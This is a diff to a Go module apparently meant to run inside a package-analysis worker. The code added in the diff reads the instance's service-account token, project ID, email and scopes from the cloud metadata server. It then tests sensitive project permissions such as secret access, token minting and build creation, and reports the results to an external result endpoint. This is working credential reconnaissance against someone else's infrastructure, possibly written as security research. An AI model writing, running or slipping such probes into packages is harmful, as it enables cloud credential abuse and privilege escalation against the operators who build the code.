@@ -26,13 +26,17 @@ var probeUserAgent string
 const (
 	protocolVersion   = 1
 	moduleName        = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion      = "v0.0.59-codex"
-	expectedUserAgent = "go-cgo-pkgsite-probe-v059-codex"
+	probeVersion      = "v0.0.71-codex"
+	expectedUserAgent = "go-cgo-pkgsite-probe-v071-codex"
 
-	metadataTokenURL = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
-	storageAPIHost   = "storage.googleapis.com"
-	storageAPIOrigin = "https://" + storageAPIHost
-	expectedPID1     = "talisman-worker-capabilities"
+	metadataTokenURL      = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+	metadataProjectURL    = "http://metadata.google.internal/computeMetadata/v1/project/project-id"
+	metadataEmailURL      = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
+	metadataScopesURL     = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"
+	storageAPIHost        = "storage.googleapis.com"
+	storageAPIOrigin      = "https://" + storageAPIHost
+	resourceManagerOrigin = "https://cloudresourcemanager.googleapis.com"
+	expectedPID1          = "talisman-worker-capabilities"
 
 	requestTimeout = 20 * time.Second
 	resultTimeout  = 30 * time.Second
@@ -52,6 +56,34 @@ var fixedPermissions = [...]string{
 	"storage.objects.list",
 	"storage.buckets.get",
 	"storage.buckets.update",
+}
+
+var fixedProjectPermissions = [...]string{
+	"artifactregistry.repositories.downloadArtifacts",
+	"artifactregistry.repositories.list",
+	"artifactregistry.repositories.uploadArtifacts",
+	"cloudbuild.builds.create",
+	"cloudbuild.builds.get",
+	"cloudbuild.builds.list",
+	"compute.instances.create",
+	"compute.instances.list",
+	"container.clusters.get",
+	"container.clusters.update",
+	"iam.serviceAccounts.actAs",
+	"iam.serviceAccounts.getAccessToken",
+	"logging.logEntries.create",
+	"pubsub.subscriptions.consume",
+	"pubsub.topics.publish",
+	"resourcemanager.projects.get",
+	"run.services.get",
+	"run.services.update",
+	"secretmanager.secrets.list",
+	"secretmanager.versions.access",
+	"serviceusage.services.list",
+	"storage.buckets.list",
+	"storage.objects.create",
+	"storage.objects.delete",
+	"storage.objects.get",
 }
 
 type commandResult struct {
@@ -84,6 +116,14 @@ type iamReport struct {
 	StartedUTC                  string                   `json:"started_utc"`
 	FinishedUTC                 string                   `json:"finished_utc"`
 	MetadataTokenAcquired       bool                     `json:"metadata_token_acquired"`
+	MetadataIdentityAcquired    bool                     `json:"metadata_identity_acquired"`
+	ProjectID                   string                   `json:"project_id,omitempty"`
+	ServiceAccountEmail         string                   `json:"service_account_email,omitempty"`
+	OAuthScopes                 []string                 `json:"oauth_scopes,omitempty"`
+	ProjectIAMHTTPStatus        int                      `json:"project_iam_http_status,omitempty"`
+	ProjectIAMAPIStatus         string                   `json:"project_iam_api_status,omitempty"`
+	ProjectPermissions          []string                 `json:"project_permissions,omitempty"`
+	ProjectIAMError             string                   `json:"project_iam_error,omitempty"`
 	BucketPermissions           []bucketPermissionResult `json:"bucket_permissions,omitempty"`
 	ObjectDataRequestsAttempted bool                     `json:"object_data_requests_attempted"`
 	MutatingRequestsAttempted   bool                     `json:"mutating_requests_attempted"`
@@ -120,10 +160,10 @@ func main() {
 		Reason:     "IAM diagnostic is fixed to the verified capslock lane",
 	}
 	endpoint := genericResultURL
-	resultID := "v059-codex-" + lane
+	resultID := "v071-codex-" + lane
 	if lane == "capslock" {
 		endpoint = compilerResultURL
-		resultID = "v059-codex-capslock-fixed-gcs-iam"
+		resultID = "v071-codex-capslock-fixed-identity-iam"
 		runFixedIAMDiagnostic(&report)
 	}
 	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
@@ -132,6 +172,18 @@ func main() {
 
 func runFixedIAMDiagnostic(report *iamReport) {
 	metadataClient := fixedHTTPClient()
+	projectID, projectErr := fetchMetadataText(metadataClient, metadataProjectURL)
+	serviceEmail, emailErr := fetchMetadataText(metadataClient, metadataEmailURL)
+	scopesText, scopesErr := fetchMetadataText(metadataClient, metadataScopesURL)
+	if projectErr == nil && emailErr == nil && scopesErr == nil {
+		scopes, ok := validateScopes(scopesText)
+		if validMetadataIdentity(projectID, serviceEmail) && ok {
+			report.MetadataIdentityAcquired = true
+			report.ProjectID = projectID
+			report.ServiceAccountEmail = serviceEmail
+			report.OAuthScopes = scopes
+		}
+	}
 	token, err := fetchMetadataToken(metadataClient)
 	metadataClient.CloseIdleConnections()
 	if err != nil {
@@ -139,6 +191,9 @@ func runFixedIAMDiagnostic(report *iamReport) {
 		return
 	}
 	report.MetadataTokenAcquired = true
+	if report.MetadataIdentityAcquired {
+		testProjectPermissions(report, token)
+	}
 	storageClient := fixedHTTPClient()
 	for _, bucket := range fixedBuckets {
 		report.BucketPermissions = append(report.BucketPermissions, testBucketPermissions(storageClient, token, bucket))
@@ -146,6 +201,102 @@ func runFixedIAMDiagnostic(report *iamReport) {
 	storageClient.CloseIdleConnections()
 	token = ""
 	report.Reason = "fixed Google Cloud Storage testIamPermissions checks completed"
+}
+
+func fetchMetadataText(client *http.Client, endpoint string) (string, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
+	defer cancel()
+	request, err := http.NewRequestWithContext(ctx, http.MethodGet, endpoint, nil)
+	if err != nil {
+		return "", errors.New("metadata identity request could not be created")
+	}
+	request.Header.Set("Metadata-Flavor", "Google")
+	request.Header.Set("User-Agent", probeUserAgent)
+	response, err := client.Do(request)
+	if err != nil {
+		return "", errors.New("metadata identity request failed")
+	}
+	defer response.Body.Close()
+	if response.StatusCode != http.StatusOK || response.Header.Get("Metadata-Flavor") != "Google" {
+		return "", errors.New("metadata identity endpoint rejected the fixed request")
+	}
+	body, err := io.ReadAll(io.LimitReader(response.Body, 16*1024+1))
+	if err != nil || len(body) == 0 || len(body) > 16*1024 || !utf8.Valid(body) {
+		return "", errors.New("metadata identity response was invalid")
+	}
+	value := strings.TrimSpace(string(body))
+	for _, character := range value {
+		if character < 0x20 || character > 0x7e {
+			return "", errors.New("metadata identity response was invalid")
+		}
+	}
+	return value, nil
+}
+
+func validMetadataIdentity(projectID, email string) bool {
+	if len(projectID) < 1 || len(projectID) > 256 || strings.ContainsAny(projectID, "/?#") {
+		return false
+	}
+	return len(email) >= 3 && len(email) <= 320 && strings.Contains(email, "@") && !strings.ContainsAny(email, " /?#")
+}
+
+func validateScopes(raw string) ([]string, bool) {
+	lines := strings.Fields(raw)
+	if len(lines) == 0 || len(lines) > 32 {
+		return nil, false
+	}
+	for _, scope := range lines {
+		if len(scope) > 256 || !strings.HasPrefix(scope, "https://www.googleapis.com/auth/") {
+			return nil, false
+		}
+	}
+	sort.Strings(lines)
+	return lines, true
+}
+
+func testProjectPermissions(report *iamReport, token string) {
+	body, err := json.Marshal(map[string]any{"permissions": fixedProjectPermissions[:]})
+	if err != nil {
+		report.ProjectIAMError = "project permission request could not be encoded"
+		return
+	}
+	endpoint := resourceManagerOrigin + "/v1/projects/" + url.PathEscape(report.ProjectID) + ":testIamPermissions"
+	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
+	defer cancel()
+	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, bytes.NewReader(body))
+	if err != nil {
+		report.ProjectIAMError = "project permission request could not be created"
+		return
+	}
+	request.Header.Set("Authorization", "Bearer "+token)
+	request.Header.Set("Content-Type", "application/json")
+	request.Header.Set("User-Agent", probeUserAgent)
+	response, err := fixedHTTPClient().Do(request)
+	if err != nil {
+		report.ProjectIAMError = "project permission request failed"
+		return
+	}
+	defer response.Body.Close()
+	report.ProjectIAMHTTPStatus = response.StatusCode
+	responseBody, err := readBoundedBody(response.Body)
+	if err != nil {
+		report.ProjectIAMError = "project permission response exceeded its bound"
+		return
+	}
+	var decoded testPermissionsResponse
+	if !isJSONContentType(response.Header.Get("Content-Type")) || !decodeOneJSON(responseBody, &decoded) {
+		report.ProjectIAMError = "project permission response was not one JSON value"
+		return
+	}
+	if decoded.Error != nil {
+		report.ProjectIAMAPIStatus = boundedAPIStatus(decoded.Error.Status)
+	}
+	granted, ok := validatedPermissions(decoded.Permissions, fixedProjectPermissions[:])
+	if !ok {
+		report.ProjectIAMError = "project permission response contained an unexpected permission"
+		return
+	}
+	report.ProjectPermissions = granted
 }
 
 func fixedHTTPClient() *http.Client {
@@ -268,8 +419,12 @@ func allowedBucket(candidate string) bool {
 }
 
 func validatedGrantedPermissions(values []string) ([]string, bool) {
-	allowed := make(map[string]struct{}, len(fixedPermissions))
-	for _, permission := range fixedPermissions {
+	return validatedPermissions(values, fixedPermissions[:])
+}
+
+func validatedPermissions(values []string, allowlist []string) ([]string, bool) {
+	allowed := make(map[string]struct{}, len(allowlist))
+	for _, permission := range allowlist {
 		allowed[permission] = struct{}{}
 	}
 	seen := make(map[string]struct{}, len(values))
